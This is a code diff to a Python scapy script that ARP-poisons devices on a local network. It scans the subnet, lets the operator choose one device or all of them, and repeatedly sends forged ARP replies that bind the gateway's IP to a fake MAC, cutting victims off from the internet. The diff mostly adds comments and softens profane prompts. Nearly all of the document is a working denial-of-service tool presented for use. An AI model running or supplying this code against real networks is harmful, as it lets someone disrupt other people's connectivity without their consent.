@@ -7,6 +7,9 @@ from scapy.all import *
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 def get_ip_macs(ips):
+  # Returns a list of tupples containing the (ip, mac address)
+  # of all of the computers on the network
+
   answers, uans = arping(ips, verbose=0)
   res = []
   for answer in answers:
@@ -16,11 +19,14 @@ def get_ip_macs(ips):
   return res
 
 def poison(victim_ip, victim_mac, gateway_ip):
-  packet = ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst=victim_mac)
+  # Send the victim an ARP packet pairing the gateway ip with the wrong
+  # mac address
+  packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victim_ip, hwdst=victim_mac)
   send(packet, verbose=0)
 
 def get_lan_ip():
-  # Pretty hacky and requires internet access, but it works
+  # A hacky method to get the current lan ip address. It requires internet
+  # access, but it works
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   s.connect(("google.com", 80))
   ip = s.getsockname()
@@ -35,7 +41,9 @@ if os.geteuid() != 0:
 # Search for stuff every time we refresh
 refreshing = True
 while refreshing:
-  # Find out what IPs to scan
+  # Use the current ip XXX.XXX.XXX.XXX and get a string in
+  # the form "XXX.XXX.XXX.*" and "XXX.XXX.XXX.1". Right now,
+  # the script assumes that the default gateway is "XXX.XXX.XXX.1"
   myip = get_lan_ip()
   ip_list = myip.split('.')
   del ip_list[-1]
@@ -45,6 +53,7 @@ while refreshing:
   ip_list.append('1')
   gateway_ip = '.'.join(ip_list)
 
+  # Get a list of devices and print them to the screen
   devices = get_ip_macs(ip_range)
   print "Connected guys:"
   i = 0
@@ -52,7 +61,9 @@ while refreshing:
     print '%s)\t%s\t%s' % (i, device[0], device[1])
     i+=1
   
-  print "Who do you want to fuck?"
+  # Get a choice and keep prompting until we get a valid letter or a number
+  # that is in range
+  print "Who do you want to boot?"
   print "(r - Refresh, a - Kill all, q - quit)"
 
   input_is_valid = False
@@ -60,35 +71,45 @@ while refreshing:
   while not input_is_valid:
     choice = raw_input(">")
     if choice.isdigit():
+      # If we have a number, see if it's in the range of choices
       if int(choice) < len(devices) and int(choice) >= 0:
         refreshing = False
         input_is_valid = True
     elif choice is 'a':
+      # If we have an a, set the flag to kill everything
       killall = True
       input_is_valid = True
       refreshing = False
     elif choice is 'r':
+      # If we have an r, say we have a valid input but let everything
+      # refresh again
       input_is_valid = True
     elif choice is 'q':
+      # If we have a q, just quit. No cleanup required
       exit()
     
     if not input_is_valid:
       print 'Please enter a valid choice'
 
+# Once we have a valid choice, we decide what we're going to do with it
 if choice.isdigit():
+  # If we have a number, loop the poison function until we get a
+  # keyboard inturrupt (ctl-c)
   choice = int(choice)
   victim = devices[choice]
-  print "Fucking %s..." % victim[0]
+  print "Preventing %s from accessing the internet..." % victim[0]
   try:
     while True:
       poison(victim[0], victim[1], gateway_ip)
   except KeyboardInterrupt:
-      print 'You\'re welcome!'
+      print '\nYou\'re welcome!'
 elif killall:
+  # If we are going to kill everything, loop the poison function until we
+  # we get a keyboard inturrupt (ctl-c)
   try:
     while True:
       for victim in devices:
         poison(victim[0], victim[1], gateway_ip)
   except KeyboardInterrupt:
-    print 'You\'re welcome!'
+    print '\nYou\'re welcome!'
     
